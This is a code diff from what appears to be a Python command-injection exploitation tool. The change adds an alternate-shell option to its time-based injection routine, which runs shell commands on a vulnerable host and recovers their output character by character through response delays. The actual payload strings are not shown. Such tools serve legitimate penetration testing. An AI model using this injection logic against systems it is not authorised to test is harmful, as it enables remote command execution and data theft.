@@ -129,7 +129,7 @@ def injection_test(payload,http_request_method,url):
 #----------------------------------------------
 # The main command injection exploitation.
 #----------------------------------------------
-def injection(separator,maxlen,TAG,cmd,prefix,suffix,delay,http_request_method,url,vuln_parameter):
+def injection(separator,maxlen,TAG,cmd,prefix,suffix,delay,http_request_method,url,vuln_parameter,alter_shell):
   if menu.options.file_write or menu.options.file_upload:
     minlen = 0
   else:
@@ -137,9 +137,13 @@ def injection(separator,maxlen,TAG,cmd,prefix,suffix,delay,http_request_method,u
   print "\n(*) Retrieving the length of execution output..."
   for j in range(int(minlen),int(maxlen)):
     
-    # Execute shell commands on vulnerable host.
-    payload = tb_payloads.cmd_execution(separator,cmd,j,delay,http_request_method)
-      
+    if alter_shell:
+      # Execute shell commands on vulnerable host.
+      payload = tb_payloads.cmd_execution_alter_shell(separator,cmd,j,delay,http_request_method)
+    else:
+      # Execute shell commands on vulnerable host.
+      payload = tb_payloads.cmd_execution(separator,cmd,j,delay,http_request_method)
+          
     # Check if defined "--prefix" option.
     if menu.options.prefix:
       prefix = menu.options.prefix
@@ -155,7 +159,7 @@ def injection(separator,maxlen,TAG,cmd,prefix,suffix,delay,http_request_method,u
       
     # Check if defined "--verbose" option.
     if menu.options.verbose:
-      sys.stdout.write("\n" + colors.GREY + payload + colors.RESET)
+      sys.stdout.write("\n" + colors.GREY + payload.replace("\n","\\n") + colors.RESET)
       
     start = 0
     end = 0
@@ -251,8 +255,12 @@ def injection(separator,maxlen,TAG,cmd,prefix,suffix,delay,http_request_method,u
   for i in range(1,int(i)):
     for ascii_char in range(32, 129):
       
-      # Get the execution ouput, of shell execution.
-      payload = tb_payloads.get_char(separator,cmd,i,ascii_char,delay,http_request_method)
+      if alter_shell:
+	# Get the execution ouput, of shell execution.
+	payload = tb_payloads.get_char_alter_shell(separator,cmd,i,ascii_char,delay,http_request_method)
+      else:
+	# Get the execution ouput, of shell execution.
+	payload = tb_payloads.get_char(separator,cmd,i,ascii_char,delay,http_request_method)
 	
       # Check if defined "--prefix" option.
       if menu.options.prefix:
@@ -266,7 +274,7 @@ def injection(separator,maxlen,TAG,cmd,prefix,suffix,delay,http_request_method,u
 
       # Check if defined "--verbose" option.
       if menu.options.verbose:
-	sys.stdout.write("\n" + colors.GREY + payload + colors.RESET)
+	sys.stdout.write("\n" + colors.GREY + payload.replace("\n","\\n") + colors.RESET)
 	
       start = 0
       end = 0
